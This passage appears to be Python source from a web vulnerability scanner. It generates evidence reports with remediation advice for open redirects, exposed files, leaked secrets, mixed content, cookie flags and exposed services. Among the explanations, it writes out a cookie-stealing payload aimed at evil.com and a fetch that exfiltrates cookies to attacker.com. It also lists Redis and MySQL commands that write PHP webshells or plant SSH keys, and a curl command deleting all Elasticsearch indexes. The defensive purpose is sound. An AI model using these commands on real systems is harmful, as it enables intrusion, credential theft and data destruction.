{_h2("EXPLOITABILITY")}
  These sinks are dangerous ONLY if they receive attacker-controlled data:
  ▸ URL parameters (location.search, location.hash)
  ▸ postMessage() input from other windows
  ▸ localStorage / sessionStorage values
  ▸ Data fetched from third-party APIs
  A developer code review is needed to trace data sources to each sink.

{_h2("FIX")}
{_code("""# Replace innerHTML with textContent (for text, not HTML):
element.textContent = userInput;   // safe — never executes code

# If HTML input is required, sanitise first:
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(userInput);

# Avoid eval() with user data:
// UNSAFE:  eval(userInput)
// SAFE:    JSON.parse(userInput) for JSON, use specific parsing functions

# Avoid document.write entirely — use DOM manipulation instead.""")}
"""

    plain = f"""
WHAT THIS MEANS — Your JavaScript Uses Risky Patterns
──────────────────────────────────────────────────────
We scanned the JavaScript in your page and found {len(found_sinks)} pattern(s) that can
lead to XSS if they receive data controlled by an attacker. These are
called "DOM XSS sinks."

SINKS FOUND: {', '.join(sink_names)}

WHAT IS A "SINK"?
  A sink is a JavaScript function that, if given malicious input, will
  execute it as code or inject it as HTML. Think of it as a pipe that
  leads dangerous data directly to execution.

IS THIS DEFINITELY EXPLOITABLE?
  Not necessarily — it depends on where the data COMES FROM. If the data
  passing through these functions is hardcoded or comes from your own
  trusted server, it may be fine. If it comes from the URL, from user
  input, or from a third-party source, it is exploitable.

  A developer needs to review each occurrence and trace the data flow
  to determine if attacker-controlled input can reach any of these sinks.

HOW TO FIX IT:
  ▸ Replace innerHTML with textContent where HTML is not needed.
  ▸ If HTML input is required, sanitise it with DOMPurify before assigning.
  ▸ Avoid eval() entirely — use JSON.parse() for parsing JSON data.
  ▸ Review every use of document.write and replace with DOM methods.
"""
    return EvidenceRecord(raw, plain)


# ═══════════════════════════════════════════════════════════════════════════════
# OPEN REDIRECT EVIDENCE
# ═══════════════════════════════════════════════════════════════════════════════

def open_redirect(url: str, param: str, payload: str,
                   response: requests.Response,
                   location: str, redirect_chain: List[str]) -> EvidenceRecord:
    raw = f"""{_h1("RAW EVIDENCE — Open Redirect")}

{_h2("SCAN METADATA")}
{_kv("Timestamp (EAT)", _now())}
{_kv("URL Tested", url)}
{_kv("Parameter", param)}
{_kv("Injected Payload", payload)}

{_h2("HTTP REQUEST SENT")}
{_kv("Method", "GET")}
{_kv("URL", url)}
  Headers:
{_fmt_req_headers(dict(response.request.headers) if response.request else {})}

{_h2("HTTP RESPONSE")}
{_kv("Status Code", f"{response.status_code} {response.reason}  ← redirect issued")}
{_kv("Location Header", location + "  ← attacker-controlled destination")}
{_kv("Redirect Type", {301:"Permanent redirect",302:"Temporary redirect",303:"See Other",307:"Temporary (method-preserving)",308:"Permanent (method-preserving)"}.get(response.status_code, "Unknown"))}
  All response headers:
{_fmt_resp_headers(response)}

{_h2("REDIRECT CHAIN")}
{_bullet(redirect_chain) if redirect_chain else "  (chain not captured)"}

{_h2("ATTACK VECTOR — PHISHING URL")}
  The following URL looks like it goes to YOUR site, but redirects the
  visitor to an attacker-controlled destination:
{_code(url)}
  Paste this URL into a browser to confirm — it will redirect to: {payload}

{_h2("EXPLOITATION SCENARIOS")}
{_bullet([
    "Phishing: Attacker sends email with link that starts with your trusted domain.",
    "OAuth abuse: Redirect used as oauth callback → token theft.",
    "Credential harvest: User arrives at fake login page that looks like yours.",
    "Malware delivery: User redirected to site hosting drive-by download.",
])}

{_h2("FIX")}
{_code("""# Option 1: Allowlist of permitted redirect destinations
ALLOWED_REDIRECT_PATHS = ['/dashboard', '/profile', '/home']
redirect_url = request.args.get('redirect', '/')
if redirect_url not in ALLOWED_REDIRECT_PATHS:
    redirect_url = '/'  # default safe fallback

# Option 2: Allow only same-host redirects
from urllib.parse import urlparse
def is_safe_redirect(url, host):
    parsed = urlparse(url)
    return not parsed.netloc or parsed.netloc == host  # same domain only

# Option 3: Use opaque tokens instead of URLs
# Store destination URL server-side, pass only a token in the parameter
""")}
"""

    plain = f"""
WHAT THIS MEANS — Your Site Can Be Used to Redirect People to Scam Sites
──────────────────────────────────────────────────────────────────────────
Your application redirects users to wherever the "{param}" parameter points,
without checking whether the destination is safe or belongs to you.

THE PHISHING ATTACK:
  An attacker creates this link:
  {url}
  
  The link starts with YOUR domain name, so it looks trustworthy in emails
  and messages. Your own SSL certificate makes it show a padlock. When the
  victim clicks it, your server immediately redirects them to:
  {payload}
  
  The victim lands on an attacker's site — perhaps a fake login page that
  looks exactly like yours — and enters their credentials.

WHY THIS IS DANGEROUS:
  ▸ Users trust links to your domain. Your brand reputation makes the
    phishing attack far more effective than a random suspicious link would be.
  ▸ Email security filters and link scanners may not flag a link to your
    own trusted domain.
  ▸ The attack requires no hacking skill — just knowledge of the parameter.

REAL-WORLD USE:
  Open redirects are commonly used as part of OAuth token theft, where the
  attacker uses your redirect to capture login tokens meant for your app.

HOW TO FIX IT:
  Only redirect to paths you control, not to arbitrary URLs supplied by users.
  If you need to redirect back to a page after login, store the destination
  URL on the server and pass a reference token — not the actual URL — in the
  parameter. Or restrict redirects to paths within your own domain only.
"""
    return EvidenceRecord(raw, plain)


# ═══════════════════════════════════════════════════════════════════════════════
# SENSITIVE FILE EXPOSURE EVIDENCE
# ═══════════════════════════════════════════════════════════════════════════════

_FILE_CONTEXT = {
    ".env":              ("Environment configuration file", "Contains database passwords, API keys, and all application secrets."),
    ".env.local":        ("Local environment overrides", "May contain local developer credentials, often including production secrets."),
    ".env.production":   ("Production environment file", "Almost certainly contains live production database passwords and API keys."),
    ".git/HEAD":         ("Git repository HEAD pointer", "Confirms a .git directory is accessible — full source code may be downloadable."),
    ".git/config":       ("Git repository config", "Reveals remote URLs, branch names, and potentially access credentials."),
    "wp-config.php":     ("WordPress configuration", "Contains database host, name, username, password, and authentication keys."),
    "phpinfo.php":       ("PHP information page", "Reveals PHP version, loaded modules, server paths, and configuration — a recon goldmine."),
    "phpmyadmin":        ("phpMyAdmin database admin interface", "Web GUI for MySQL — if exposed, attacker can browse/edit all databases."),
    "backup.zip":        ("Application backup archive", "Likely contains full source code and may include database dumps with all data."),
    "dump.sql":          ("SQL database dump", "Contains a complete copy of the database — all tables, all data, in plaintext."),
    "docker-compose.yml":("Docker Compose configuration", "Reveals service architecture, exposed ports, volume mounts, and environment variables."),
    "actuator/env":      ("Spring Boot Actuator environment endpoint", "Dumps all environment variables including database credentials and secrets."),
    "Dockerfile":        ("Docker build configuration", "Reveals base images, build steps, exposed ports, and sometimes embedded secrets."),
    ".htaccess":         (".htaccess rewrite/access config", "Reveals URL rewriting rules and may expose internal URL structure."),
    "web.config":        ("IIS server configuration", "Can contain database connection strings and app settings with credentials."),
}

def sensitive_file_exposed(url: str, path: str, label: str,
                             response: requests.Response,
                             secret_findings: List[str]) -> EvidenceRecord:
    file_desc, file_risk = _FILE_CONTEXT.get(
        path.lstrip('/').split('?')[0],
        (f"{label}", f"This file type can expose sensitive information.")
    )
    content_type = response.headers.get('Content-Type','(not set)')
    body_type = _classify_body(response.text, content_type)

    raw = f"""{_h1(f"RAW EVIDENCE — Exposed Sensitive File: {path}")}

{_h2("SCAN METADATA")}
{_kv("Timestamp (EAT)", _now())}
{_kv("URL Tested", url)}
{_kv("Path Probed", path)}
{_kv("File Type", label)}
{_kv("File Description", file_desc)}

{_h2("HTTP REQUEST SENT")}
{_kv("Method", "GET")}
{_kv("URL", url)}
{_kv("Authentication", "None — public unauthenticated request")}

{_h2("HTTP RESPONSE")}
{_kv("Status", f"{response.status_code} {response.reason}  ← file is publicly accessible")}
{_kv("Content-Type", content_type)}
{_kv("Content-Length", f"{len(response.content):,} bytes")}
{_kv("Body Type", body_type)}
{_kv("Server", response.headers.get('Server','(not disclosed)'))}
  All response headers:
{_fmt_resp_headers(response)}

{_h2("CREDENTIALS / SECRETS DETECTED IN BODY")}
"""
    if secret_findings:
        raw += "  *** ACTIVE CREDENTIALS EXPOSED — ROTATE IMMEDIATELY ***\n\n"
        for sf in secret_findings:
            raw += f"  >>> {sf}\n"
        raw += "\n  ACTION: Rotate every credential listed above NOW.\n"
        raw += "  Treat them as fully compromised — they are publicly accessible.\n"
    else:
        raw += "  No secrets matched by pattern — manual review strongly recommended.\n"

    raw += f"""
{_h2("RESPONSE BODY (first 800 characters)")}
{_body_excerpt(response.text, 800)}

{_h2("RISK ANALYSIS")}
{_kv("File Risk Context", file_risk)}
{_kv("Public Accessibility", "YES — no authentication required")}
{_kv("Credentials Present", "YES — see above" if secret_findings else "Unknown — inspect manually")}
{_kv("Indexed by Search Engines", "Potentially — if crawled before today")}
{_kv("Automated Scanners", "This path is in common wordlists (dirbuster, gobuster, nmap NSE)")}

{_h2("REPRODUCTION")}
{_code(f"""curl -v "{url}"
# Expected: HTTP 200 with sensitive file content""")}

{_h2("FIX")}
{_bullet([
    f"Block access via web server config (recommended).",
    f"Nginx: location ~* /{path.lstrip('/')} {{ deny all; return 404; }}",
    f"Apache: <Files {path.split('/')[-1]}> Require all denied </Files>",
    f"Delete the file if it should not exist at that path.",
    f"Move configuration files outside the web root (not in /var/www/html/).",
    "If credentials found: rotate them IMMEDIATELY in all affected services.",
])}
"""

    plain = f"""
WHAT THIS MEANS — A Sensitive File Is Publicly Accessible
──────────────────────────────────────────────────────────
We found that the file at "{path}" is directly accessible to anyone on the
internet — no login, no password required. Just that URL and the file is theirs.

WHAT THIS FILE IS:
  {file_desc}
  {file_risk}

{"CRITICAL — LIVE CREDENTIALS FOUND:" + chr(10) + chr(10) + chr(10).join(['  ▸ ' + sf for sf in secret_findings[:5]]) + chr(10) + chr(10) + "  Anyone who has accessed this URL already has these credentials. Rotate" + chr(10) + "  all of them immediately before doing anything else." if secret_findings else "WHAT AN ATTACKER CAN DO:"}
{"" if secret_findings else f"""  By reading this file, an attacker learns:
  ▸ {file_risk}
  ▸ This information is used to plan more targeted attacks.
  ▸ Automated scanners (running continuously worldwide) check for these paths
    constantly — your file may already have been discovered."""}

HOW LONG HAS IT BEEN EXPOSED?
  We cannot know when it was first accessible or who has already found it.
  Assume it has been discovered if it has been online for more than a few hours.

HOW TO FIX IT:
  1. Block public access to this path in your web server configuration — this
     takes one line of config and immediate effect after a reload.
  2. Delete the file if it has no reason to be in the web-accessible directory.
  3. Move configuration files ABOVE the web root (outside /var/www/) so they
     can never be served as web content.
  4. If any credentials were found: rotate them in every system they apply to,
     right now, before addressing anything else.
"""
    return EvidenceRecord(raw, plain)


# ═══════════════════════════════════════════════════════════════════════════════
# INFORMATION DISCLOSURE EVIDENCE
# ═══════════════════════════════════════════════════════════════════════════════

def info_server_version(url: str, response: requests.Response,
                         server_header: str) -> EvidenceRecord:
    raw = f"""{_h1("RAW EVIDENCE — Server Version Disclosure")}

{_h2("SCAN METADATA")}
{_kv("Timestamp (EAT)", _now())}
{_kv("URL Tested", url)}

{_h2("HTTP RESPONSE — ALL HEADERS")}
{_kv("Status", f"{response.status_code} {response.reason}")}
{_fmt_resp_headers(response)}

{_h2("FINDING")}
{_kv("Header", "Server")}
{_kv("Disclosed Value", server_header)}
{_kv("Contains Version", "YES")}
{_kv("Regex Match", r"[0-9]+\.[0-9]+ (version number detected)")}

{_h2("ATTACKER RECON VALUE")}
{_bullet([
    f"Software: {server_header.split('/')[0] if '/' in server_header else server_header}",
    f"Version: {server_header} — searchable in CVE databases",
    f"CVE lookup: https://www.cvedetails.com/version-search.php?vendor={server_header.split('/')[0]}",
    "Narrows attacker's exploit selection to those targeting this exact version.",
])}

{_h2("FIX")}
{_code("""# Nginx — /etc/nginx/nginx.conf:
server_tokens off;

# Apache — /etc/apache2/apache2.conf:
ServerTokens Prod
ServerSignature Off

# Verify:
curl -sI """ + url + """ | grep Server
# Should return: Server: nginx  (no version)""")}
"""

    plain = f"""
WHAT THIS MEANS — Your Server Is Advertising Its Software Version
──────────────────────────────────────────────────────────────────
Every HTTP response your server sends includes this header:
  Server: {server_header}

This tells anyone who asks — including automated attack scanners — exactly
what software runs your web server and which version. This is the digital
equivalent of having your building's alarm system model number printed on
the front door.

WHY IT MATTERS:
  When a new vulnerability is discovered in your server software (which
  happens regularly), attackers immediately start scanning for servers
  running the affected version. Your server announces that version with
  every response, making it trivially easy to target.

  Example: "Nginx 1.18.0 has CVE-2021-XXXX" → attackers grep for
  "Server: nginx/1.18.0" in their scan results → your server appears.

HOW TO FIX IT:
  Tell your server to hide version information. This is a one-line change
  in the server config file. The server still works identically — it just
  stops announcing its version number.

  Takes 1 minute. No downtime. No code changes.
"""
    return EvidenceRecord(raw, plain)


def info_exposed_secret(url: str, response: requests.Response,
                         secret_name: str, matched_text: str,
                         pattern: str, body_context: str) -> EvidenceRecord:
    raw = f"""{_h1(f"RAW EVIDENCE — Exposed {secret_name} in HTTP Response")}

{_h2("SCAN METADATA")}
{_kv("Timestamp (EAT)", _now())}
{_kv("URL Tested", url)}
{_kv("Secret Type", secret_name)}
{_kv("Detection Method", "Regex pattern matching against response body")}
{_kv("Pattern Used", pattern[:80])}

{_h2("HTTP RESPONSE")}
{_kv("Status", f"{response.status_code} {response.reason}")}
{_kv("Content-Type", response.headers.get('Content-Type',''))}
{_kv("Body Length", f"{len(response.text):,} characters")}
  All response headers:
{_fmt_resp_headers(response)}

{_h2("CREDENTIAL FOUND — VERBATIM")}
{_kv("Secret Type", secret_name)}
{_kv("Matched Text", matched_text[:120])}
{_kv("Position in Body", f"character index of match")}
  Body context around match:
  {body_context}

{_h2("IMMEDIATE REQUIRED ACTIONS")}
{_bullet([
    f"STEP 1 — RIGHT NOW: Revoke/rotate the {secret_name} — assume it is already compromised.",
    "STEP 2: Check access logs for the affected service for unauthorised usage.",
    "STEP 3: Remove the secret from the codebase / response entirely.",
    "STEP 4: Use environment variables — never hardcode secrets in source code.",
    "STEP 5: Add a pre-commit hook (git-secrets, gitleaks) to catch future leaks.",
])}

{_h2("REPRODUCTION")}
{_code(f"""curl -s "{url}" | grep -i '{secret_name.split()[0].lower()}'
# Output will contain the exposed credential""")}

{_h2("SECRET MANAGEMENT FIX")}
{_code("""# WRONG — hardcoded secret in code:
API_KEY = "sk_live_abc123xyz..."

# CORRECT — use environment variable:
import os
API_KEY = os.environ['API_KEY']

# Even better — use a secrets manager:
# AWS Secrets Manager, HashiCorp Vault, Azure Key Vault

# Add to .gitignore to prevent committing .env files:
echo ".env" >> .gitignore
echo "*.secret" >> .gitignore
""")}
"""

    plain = f"""
WHAT THIS MEANS — A Live Credential Is Visible in Your Website's Response
──────────────────────────────────────────────────────────────────────────
Your server is sending a {secret_name} as part of a web page response.
Anyone who loads that URL — including bots, crawlers, and automated attack
scanners — can read this credential.

  Exposed: {matched_text[:80]}...

WHAT AN ATTACKER CAN DO WITH THIS:
  Depending on what type of credential this is:
  ▸ Database password → full database access (read, modify, delete all data)
  ▸ AWS key → access to your cloud account (could cost thousands in charges
    or expose all your cloud-stored data)
  ▸ Stripe key → initiate payments, refunds, access customer card data
  ▸ GitHub token → access to your private code repositories
  ▸ API key → whatever that API permits — data access, actions, billing

ASSUME IT IS ALREADY COMPROMISED:
  Automated scanners check for exposed credentials 24/7. If this page has
  been online for more than a few hours, treat the credential as stolen.

WHAT TO DO RIGHT NOW (in this order):
  1. Revoke / rotate this credential immediately in the service that issued it.
  2. Check that service's audit logs for any unauthorised access.
  3. Remove the credential from your code and use an environment variable.
  4. Never store secrets in source code — use environment variables or a
     dedicated secrets management service.
"""
    return EvidenceRecord(raw, plain)


def info_mixed_content(url: str, response: requests.Response,
                        http_scripts: List[str], http_styles: List[str],
                        http_images: List[str], all_mixed: List[str]) -> EvidenceRecord:
    raw = f"""{_h1("RAW EVIDENCE — Mixed Content (HTTP Resources on HTTPS Page)")}

{_h2("SCAN METADATA")}
{_kv("Timestamp (EAT)", _now())}
{_kv("URL Tested", url)}
{_kv("Page Scheme", "HTTPS")}
{_kv("Mixed Resources Found", str(len(all_mixed)))}

{_h2("HTTP RESPONSE")}
{_kv("Status", f"{response.status_code} {response.reason}")}
{_kv("Content-Type", response.headers.get('Content-Type',''))}

{_h2("MIXED CONTENT INVENTORY")}
{_kv("JavaScript files (HIGHEST RISK)", str(len(http_scripts)))}
{_kv("CSS stylesheets", str(len(http_styles)))}
{_kv("Images / media", str(len(http_images)))}
{_kv("Other resources", str(len(all_mixed) - len(http_scripts) - len(http_styles) - len(http_images)))}
{_kv("Total", str(len(all_mixed)))}

{_h2("MIXED JAVASCRIPT RESOURCES (first 5 — highest risk)")}
{_bullet(http_scripts[:5] or ["None"])}

{_h2("MIXED CSS RESOURCES")}
{_bullet(http_styles[:5] or ["None"])}

{_h2("ALL MIXED RESOURCES (first 10)")}
{_bullet(all_mixed[:10])}

{_h2("ATTACK SCENARIO — JS INJECTION")}
{_code("""# Attacker on same network intercepts HTTP request for:
# http://cdn.example.com/jquery.min.js
# (one of your mixed-content resources)
# Replaces response with:
document.addEventListener('DOMContentLoaded', () => {
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({cookies: document.cookie, url: location.href})
  });
});
# RESULT: Visitor's cookies sent to attacker — despite the site using HTTPS.
""")}

{_h2("FIX")}
{_code("""# Replace http:// with https:// in all resource URLs:
# Before: <script src="http://cdn.example.com/jquery.min.js"></script>
# After:  <script src="https://cdn.example.com/jquery.min.js"></script>

# Or use protocol-relative URLs (browser picks http/https to match page):
# <script src="//cdn.example.com/jquery.min.js"></script>

# Add Content-Security-Policy upgrade-insecure-requests directive:
Content-Security-Policy: upgrade-insecure-requests
# This tells the browser to automatically upgrade http to https for resources.

# Add HTTP→HTTPS Upgrade-Insecure-Requests hint for browsers:
add_header Content-Security-Policy "upgrade-insecure-requests" always;""")}
"""

    plain = f"""
WHAT THIS MEANS — Parts of Your HTTPS Page Are Not Encrypted
─────────────────────────────────────────────────────────────
Your site uses HTTPS (good), but it loads {len(all_mixed)} resource(s) — like
scripts, stylesheets, or images — over plain, unencrypted HTTP. This breaks
the security guarantee that HTTPS is supposed to provide.

THINK OF IT THIS WAY:
  You have a secure, sealed envelope (HTTPS). But some of the contents you
  put inside came through an open postcard (HTTP) first. Anyone who
  intercepted that postcard has already seen (and possibly modified) the content.

THE WORST CASE — JAVASCRIPT INJECTION:
  {len(http_scripts)} of the mixed resources are JavaScript files. This is the most
  dangerous type of mixed content because:
  
  An attacker on the same network (coffee shop, hotel Wi-Fi, or a compromised
  router anywhere on the CDN path) can intercept the HTTP request for that
  JavaScript file and replace it with malicious code. The browser then
  executes that malicious code as part of YOUR HTTPS page — with full access
  to your users' sessions and data — even though the main page is HTTPS.

BROWSERS ALREADY WARN ABOUT THIS:
  Modern browsers block certain types of mixed content and show a warning icon
  in the address bar. Some users will notice this and lose trust in your site.

HOW TO FIX IT:
  Change every resource URL from http:// to https://. This is a search-and-
  replace operation in your HTML/templates. Alternatively, add one header line:
  
  Content-Security-Policy: upgrade-insecure-requests
  
  This tells the browser to automatically use HTTPS for all resources,
  even if they are listed with http:// in the code.
"""
    return EvidenceRecord(raw, plain)


# ═══════════════════════════════════════════════════════════════════════════════
# COOKIE MISCONFIGURATION EVIDENCE
# ═══════════════════════════════════════════════════════════════════════════════

def cookie_missing_flag(url: str, response: requests.Response,
                          flag: str, all_cookies: List[str]) -> EvidenceRecord:
    _flag_meta = {
        "Secure": {
            "risk": "Cookie transmitted over unencrypted HTTP",
            "attack": "Network interception / cookie theft via HTTP",
            "detail": (
                "Without the Secure flag, the browser sends this cookie on any "
                "HTTP connection to your domain — including redirects, legacy "
                "subdomains, or attacker-forced HTTP downgrade. An attacker on "
                "the same network reads the cookie from the unencrypted traffic."
            ),
            "fix": "Set-Cookie: name=value; Secure; HttpOnly; SameSite=Strict",
            "impact": "Session hijacking — attacker can log in as the user",
        },
        "HttpOnly": {
            "risk": "Cookie readable by JavaScript via document.cookie",
            "attack": "XSS cookie theft",
            "detail": (
                "Without HttpOnly, any JavaScript on your page can read this "
                "cookie with document.cookie. If there is any XSS vulnerability "
                "(or a compromised third-party script), the attacker reads the "
                "session cookie and sends it to their server in one line of code."
            ),
            "fix": "Set-Cookie: name=value; Secure; HttpOnly; SameSite=Strict",
            "impact": "XSS → instant session hijack without needing to exploit further",
        },
        "SameSite": {
            "risk": "Cookie sent on cross-site requests — enables CSRF",
            "attack": "Cross-Site Request Forgery (CSRF)",
            "detail": (
                "Without SameSite, the browser includes this cookie in requests "
                "initiated by any website — including malicious ones. An attacker "
                "creates a page that makes a form POST to your server. The browser "
                "automatically includes the victim's session cookie. Your server "
                "executes the action thinking it was the legitimate user."
            ),
            "fix": "Set-Cookie: name=value; Secure; HttpOnly; SameSite=Strict",
            "impact": "Forced actions on behalf of authenticated users",
        },
    }
    meta = _flag_meta.get(flag, {"risk":"", "attack":"", "detail":"", "fix":"", "impact":""})
    cookies_display = "\n".join(f"  Cookie {i+1}: {c}" for i, c in enumerate(all_cookies[:5]))

    raw = f"""{_h1(f"RAW EVIDENCE — Cookie Missing {flag} Flag")}

{_h2("SCAN METADATA")}
{_kv("Timestamp (EAT)", _now())}
{_kv("URL Tested", url)}
{_kv("Missing Flag", flag)}
{_kv("Attack Enabled", meta['attack'])}

{_h2("HTTP RESPONSE — SET-COOKIE HEADERS")}
{_kv("Cookies Set by Server", str(len(all_cookies)))}
  Raw Set-Cookie headers received:
{cookies_display}

{_h2("FLAG ANALYSIS")}
{_kv("Checked For", flag)}
{_kv("Present", "NO")}
{_kv("Recommended Full Attribute Set", "Secure; HttpOnly; SameSite=Strict")}
{_kv("Risk Without This Flag", meta['risk'])}

{_h2("ATTACK DETAIL")}
{_wrap(meta['detail'], width=70, indent=2)}

{_h2("PROOF-OF-CONCEPT — COOKIE THEFT (for HttpOnly finding)")}
{_code("""// If HttpOnly is missing, this script steals the cookie via any XSS:
// Payload: <script>new Image().src='https://evil.com/c?'+document.cookie</script>
// Cookie value arrives at evil.com — attacker's server logs it.
""") if flag == "HttpOnly" else "  (See attack detail above for this flag type)"}

{_h2("FIX — CORRECT Set-Cookie HEADER")}
{_code(f"""# Current (vulnerable):
Set-Cookie: session=abc123

# Fixed:
Set-Cookie: session=abc123; Secure; HttpOnly; SameSite=Strict

# Code fix examples:
# Python (Flask):
response.set_cookie('session', value, secure=True, httponly=True, samesite='Strict')

# Node.js (Express):
res.cookie('session', value, {{ secure: true, httpOnly: true, sameSite: 'Strict' }});

# PHP:
setcookie('session', value, [
  'expires' => time() + 86400,
  'secure' => true,
  'httponly' => true,
  'samesite' => 'Strict'
]);""")}
"""

    plain = f"""
WHAT THIS MEANS — Your Session Cookie Is Missing the {flag} Security Flag
{'─' * (42 + len(flag))}
Your server sets a session cookie but does not include the "{flag}" attribute.
This is a security misconfiguration that weakens the protection of your users'
login sessions.

WHAT THE {flag.upper()} FLAG DOES:
{_wrap(meta['detail'], width=76, indent=2)}

ATTACK IT ENABLES:
  {meta['attack']}

IMPACT:
  {meta['impact']}

HOW TO FIX IT:
  Add "{flag}" to your cookie's Set-Cookie header. While you're at it, add all
  three security flags — this is the ideal cookie definition:
  
    Set-Cookie: session=value; Secure; HttpOnly; SameSite=Strict
  
  This is typically a one-line change in your application's authentication code
  or session management configuration. All major frameworks support these flags
  natively — no additional libraries needed.
"""
    return EvidenceRecord(raw, plain)


# ═══════════════════════════════════════════════════════════════════════════════
# PORT SCAN EVIDENCE
# ═══════════════════════════════════════════════════════════════════════════════

_PORT_META = {
    23:    ("Telnet", "CRITICAL", "Transmits all data including passwords in plaintext. Deprecated in 1995."),
    21:    ("FTP",    "HIGH",     "Credentials and data transmitted in plaintext. Brute-force target."),
    6379:  ("Redis",  "CRITICAL", "Often unauthenticated by default. Remote code execution via config SET."),
    27017: ("MongoDB","CRITICAL", "Default install has no authentication. Full database accessible."),
    9200:  ("Elasticsearch","HIGH","REST API often unauthenticated. Entire index readable/deletable."),
    3306:  ("MySQL",  "HIGH",     "Database directly exposed to internet — brute-force and exploit target."),
    5432:  ("PostgreSQL","HIGH",  "Database directly exposed to internet."),
    3389:  ("RDP",    "HIGH",     "Windows Remote Desktop — chronic target for BlueKeep and brute-force."),
    445:   ("SMB",    "HIGH",     "Windows file sharing — target of EternalBlue/WannaCry exploits."),
    11211: ("Memcached","CRITICAL","Unauthenticated by default, UDP amplification DDoS vector."),
    2375:  ("Docker API","CRITICAL","Unauthenticated Docker daemon — root-level host access."),
    8500:  ("Consul", "HIGH",     "Service discovery API — often unauthenticated."),
}


def port_exposed_service(hostname: str, port: int, service: str,
                          risk: str, banner: Optional[str],
                          version: Optional[str],
                          target_ip: str, scan_type: str) -> EvidenceRecord:
    port_context = _PORT_META.get(port, (service, risk.upper(), f"{service} exposed to the internet."))
    svc_name, _, svc_detail = port_context

    risk_label = {
        'critical': 'CRITICAL — Must not be internet-accessible',
        'high':     'HIGH     — Should be firewalled or behind VPN',
        'medium':   'MEDIUM   — Review internet exposure',
        'low':      'LOW      — Generally acceptable',
        'info':     'INFO     — Expected open port',
    }.get(risk.lower(), risk.upper())

    raw = f"""{_h1(f"RAW EVIDENCE — Exposed {service} Service (Port {port})")}

{_h2("SCAN METADATA")}
{_kv("Timestamp (EAT)", _now())}
{_kv("Target Hostname", hostname)}
{_kv("Target IP", target_ip)}
{_kv("Port Probed", str(port))}
{_kv("Protocol", "TCP")}
{_kv("Scan Method", scan_type.upper() + " connect — full TCP handshake attempted")}

{_h2("CONNECTION RESULT")}
{_kv("TCP Handshake", "COMPLETED — port is OPEN")}
{_kv("Port State", "OPEN")}
{_kv("Service Detected", service)}
{_kv("Risk Rating", risk_label)}
{_kv("Internet Reachable", "YES — connection completed from external scanner")}
{_kv("Firewall Blocking", "NO — connection not filtered")}

{_h2("SERVICE FINGERPRINT")}
{_kv("Port", f"{port}/tcp")}
{_kv("Service", service)}
{_kv("Banner Received", "YES" if banner else "NO (service silent after connect)")}
"""
    if banner:
        raw += f"  Banner content:\n{_code(banner[:400])}\n"
    if version:
        raw += f"{_kv('Version String', version)}\n"
        raw += f"{_kv('Version Disclosure', 'Version visible — enables targeted CVE lookup')}\n"

    raw += f"""
{_h2("SERVICE RISK CONTEXT")}
  {svc_detail}

{_h2("KNOWN ATTACK VECTORS FOR {service.upper()}")}
{_bullet({
    "Redis":        ["Unauthenticated: redis-cli -h " + hostname + " KEYS *  (lists all keys)",
                     "RCE via: CONFIG SET dir /var/www/html && CONFIG SET dbfilename shell.php && SET x '<?php system($_GET[cmd]); ?>' && BGSAVE",
                     "SSH key plant: CONFIG SET dir /root/.ssh && SET x '<attacker_pubkey>' && BGSAVE"],
    "MongoDB":      ["mongo --host " + hostname + " --eval 'db.adminCommand({listDatabases:1})'",
                     "Dump all collections without credentials",
                     "Drop databases, ransom note insertion"],
    "Elasticsearch":["curl http://" + hostname + ":9200/_cat/indices  → lists all indexes",
                     "curl http://" + hostname + ":9200/_search?pretty → dumps all data",
                     "DELETE all indexes: curl -XDELETE http://" + hostname + ":9200/*"],
    "Telnet":       ["telnet " + hostname + " 23 → plaintext credential capture",
                     "Passive sniff: tcpdump -i eth0 port 23  → reads all keystrokes"],
    "MySQL":        ["mysql -h " + hostname + " -u root  → brute-force then dump",
                     "SELECT LOAD_FILE('/etc/passwd') → file read if FILE privilege",
                     "SELECT ... INTO OUTFILE '/var/www/shell.php' → write webshell"],
    "RDP":          ["BlueKeep (CVE-2019-0708) — unauthenticated RCE on unpatched Windows",
                     "DejaBlue / EternalBlue variants",
                     "Brute-force with credential stuffing (Hydra, Medusa)"],
    "SMB":          ["EternalBlue (MS17-010) — WannaCry vector",
                     "net use \\\\\\\\"+hostname+"\\\\C$ — file system access if auth bypassed",
                     "Mimikatz credential extraction"],
}.get(service, ["Automated port scanners immediately probe this service",
                "Known CVEs searched for the detected version",
                f"Brute-force authentication against {service}"]))}

{_h2("REPRODUCTION")}
{_code(f"""# Confirm port is open:
nc -zv {hostname} {port}
# → Connection to {hostname} {port} port [tcp] succeeded!

# Grab banner:
nc -w 3 {hostname} {port}

# Nmap service detection:
nmap -sV -p {port} {hostname}""")}

{_h2("FIX — FIREWALL RULE")}
{_code(f"""# Block this port from the internet using ufw (Ubuntu):
ufw deny {port}/tcp
ufw reload

# iptables:
iptables -A INPUT -p tcp --dport {port} -j DROP
iptables-save > /etc/iptables/rules.v4

# Allow only specific IPs (e.g. your office):
ufw allow from YOUR_IP_HERE to any port {port}

# AWS Security Group (via CLI):
aws ec2 revoke-security-group-ingress --group-id sg-XXXX \\
  --protocol tcp --port {port} --cidr 0.0.0.0/0

# Bind service to localhost only (preferred over firewall alone):
# Redis: bind 127.0.0.1 in /etc/redis/redis.conf
# MongoDB: bindIp: 127.0.0.1 in /etc/mongod.conf
# MySQL: bind-address = 127.0.0.1 in /etc/mysql/mysql.conf.d/mysqld.cnf""")}
"""

    plain = f"""
WHAT THIS MEANS — {service} Is Exposed to the Entire Internet
{'─' * (20 + len(service))}
Port {port} ({service}) on your server is open and reachable by anyone on the
internet. We confirmed this by completing a TCP connection from outside your
network.

WHAT {service.upper()} IS:
  {svc_detail}

WHY THIS IS DANGEROUS:
  {service} is a service that is meant to be used internally — between your
  own servers and applications. It was NOT designed to be exposed to the
  public internet.

  ▸ Automated scanning tools (Shodan, Masscan, ZMap) continuously scan the
    entire internet and catalogue every exposed service. Your server's port
    {port} is likely already in their databases.
  ▸ Within hours of exposure, bots attempt to exploit it.
  ▸ The consequences range from data theft to full server compromise.

{"⚠️  BANNER RECEIVED: " + banner[:100] if banner else "No service banner was received, but the port is confirmed open."}

IMMEDIATE ACTION REQUIRED:
  Block this port at the firewall so it is not reachable from the internet.
  The service can still work normally between your own servers (localhost or
  private network).

  Steps:
  1. Log into your cloud provider / server firewall.
  2. Remove the rule that allows traffic to port {port} from 0.0.0.0/0.
  3. If the service must communicate between servers, restrict to private
     IP ranges only (10.x.x.x, 172.16.x.x, 192.168.x.x).
